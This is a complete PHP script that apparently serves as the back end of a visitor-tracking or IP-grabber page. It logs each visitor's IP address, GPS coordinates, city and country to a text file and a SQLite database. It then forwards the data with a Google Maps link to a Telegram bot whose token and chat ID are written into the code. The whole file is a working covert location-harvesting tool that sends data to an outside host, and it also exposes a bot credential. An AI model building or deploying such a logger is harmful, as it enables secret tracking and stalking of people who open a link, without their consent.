<?php
// Logger: logs IP + geolocation into SQLite + log.txt + Telegram

date_default_timezone_set('Asia/Kolkata');

$ip = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
$input = json_decode(file_get_contents("php://input"), true);

$latitude = $input['latitude'] ?? 'N/A';
$longitude = $input['longitude'] ?? 'N/A';
$city = $input['city'] ?? 'Unknown';
$country = $input['country'] ?? 'Unknown';
$timestamp = date("Y-m-d H:i:s");
$mapLink = "https://www.google.com/maps?q=$latitude,$longitude";

// Store to log.txt
$logLine = "IP: $ip | Lat: $latitude | Lon: $longitude | City: $city | Country: $country | Time: $timestamp | Link: $mapLink\n";
file_put_contents("log.txt", $logLine, FILE_APPEND);

// Store to SQLite
$db = new SQLite3('log.db');
$db->exec("CREATE TABLE IF NOT EXISTS logs (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  ip TEXT,
  latitude TEXT,
  longitude TEXT,
  city TEXT,
  country TEXT,
  timestamp TEXT
)");

$stmt = $db->prepare("INSERT INTO logs (ip, latitude, longitude, city, country, timestamp) VALUES (?, ?, ?, ?, ?, ?)");
$stmt->bindValue(1, $ip);
$stmt->bindValue(2, $latitude);
$stmt->bindValue(3, $longitude);
$stmt->bindValue(4, $city);
$stmt->bindValue(5, $country);
$stmt->bindValue(6, $timestamp);
$stmt->execute();

// Optional: Telegram Notify
$chat_id = "6602027873";
$bot_token = "7943375930:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8";

$msg = "🕵️ New Visitor Logged\n\n".
       "🌍 IP: $ip\n".
       "📍 Location: $latitude, $longitude\n".
       "🏙️ City: $city\n".
       "🌐 Country: $country\n".
       "🕒 Time: $timestamp\n".
       "🔗 [View on Google Maps]($mapLink)";

$url = "https://api.telegram.org/bot$bot_token/sendMessage";
$params = [
  "chat_id" => $chat_id,
  "text" => $msg,
  "parse_mode" => "Markdown"
];

$options = [
  'http' => [
    'header'  => "Content-Type: application/x-www-form-urlencoded",
    'method'  => 'POST',
    'content' => http_build_query($params)
  ]
];
$context  = stream_context_create($options);
file_get_contents($url, false, $context);

echo json_encode(["status" => "logged"]);
?>
